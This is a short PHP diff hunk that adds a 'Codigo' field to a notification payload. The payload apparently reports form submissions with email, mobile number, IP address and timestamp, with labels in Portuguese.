@@ -54,6 +54,7 @@ $payload = [
             ['name' => 'E‑mail',   'value' => $email,    'inline' => true],
             ['name' => 'Celular',  'value' => $celular,  'inline' => true],
             ['name' => 'IP',       'value' => $ip,       'inline' => true],
+            ['name' => 'Codigo',   'value' => $codigo,   'inline' => true],
             ['name' => 'Recebido', 'value' => date('d/m/Y H:i:s'), 'inline' => true],
         ],
     ]],
